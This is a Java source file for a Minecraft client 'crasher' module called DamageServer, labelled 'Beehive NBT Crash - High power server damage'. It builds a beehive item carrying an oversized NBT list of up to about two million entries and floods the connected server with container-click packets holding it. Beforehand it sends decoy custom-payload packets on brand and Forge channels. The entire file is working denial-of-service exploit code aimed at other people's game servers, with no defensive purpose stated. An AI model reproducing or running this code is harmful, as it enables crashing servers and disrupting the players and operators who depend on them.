package us.whitedev.crashers.impl;

import us.whitedev.crashers.Crasher;
import us.whitedev.helpers.MessageHelper;
import us.whitedev.utils.OptionUtil;
import us.whitedev.utils.OptionType;
import net.minecraft.client.Minecraft;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.network.protocol.game.ServerboundContainerClickPacket;
import net.minecraft.world.inventory.ClickType;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.CompletableFuture;

public class DamageServer extends Crasher {
    private final Minecraft mc = Minecraft.getInstance();
    private final Random random = new Random();
    private boolean enabled = false;
    private String mode = "Test";

    public DamageServer() {
        super("DamageServer", "Beehive NBT Crash - High power server damage", true);
    }

    @Override
    public String getArgsUsage() { return "<mode>"; }

    @Override
    public List<OptionUtil> getOptions() {
        List<OptionUtil> options = new ArrayList<>();
        options.add(new OptionUtil("Mode", OptionType.LIST, new String[]{"Effective", "Small", "Test"}));
        return options;
    }

    @Override
    public void applyOptions(String[] values) {
        if (values.length > 0) this.mode = values[0];
    }

    @Override
    public void onMethod(String[] args) {
        if (mc.screen != null) return;
        if (mc.player == null || mc.getConnection() == null || mc.player.containerMenu == null) {
            msgHelper.sendMessage("&cNot ready!", true);
            return;
        }

        int power, size;
        switch (mode) {
            case "Effective" -> { power = 500; size = 2096000; }
            case "Small" -> { power = 500; size = 2500; }
            case "Test" -> { power = 5000; size = 35000; }
            default -> { power = 500; size = 2500; }
        }

        sendLegitimatePayloads();
        msgHelper.sendMessage("&fSending &6" + power + " &fpackets...", true);

        int finalPower = power, finalSize = size;
        CompletableFuture.runAsync(() -> {
            CompoundTag blockEntityTag = new CompoundTag();
            ListTag beesList = new ListTag();
            for (int i = 0; i < finalSize; i++) beesList.add(new CompoundTag());
            blockEntityTag.put("Bees", beesList);
            CompoundTag mainTag = new CompoundTag();
            mainTag.put("BlockEntityTag", blockEntityTag);

            ItemStack stack = new ItemStack(Items.BEEHIVE, 1);
            stack.setTag(mainTag);

            int windowId = mc.player.containerMenu.containerId;
            for (int i = 0; i < finalPower; i++) {
                ServerboundContainerClickPacket packet = new ServerboundContainerClickPacket(
                    windowId, 0, random.nextInt(36), 0, ClickType.PICKUP, stack,
                    new it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap<>()
                );
                mc.getConnection().send(packet);
            }
            msgHelper.sendMessage("&aDamageServer completed!", true);
        });
    }

    private void sendLegitimatePayloads() {
        String[] channels = {"minecraft:brand", "fml:handshake", "fml:hs", "limbo", "api"};
        for (String channel : channels) {
            try {
                io.netty.buffer.ByteBuf buffer = io.netty.buffer.Unpooled.buffer();
                net.minecraft.network.FriendlyByteBuf buf = new net.minecraft.network.FriendlyByteBuf(buffer);
                buf.writeUtf("{}");
                mc.getConnection().send(new net.minecraft.network.protocol.common.ServerboundCustomPayloadPacket(
                    new net.minecraft.resources.ResourceLocation(channel), buf
                ));
            } catch (Exception ignored) {}
        }
    }

    @Override
    public boolean getEnabled() { return enabled; }

    @Override
    public void setEnabled(boolean bool) { this.enabled = bool; }
}
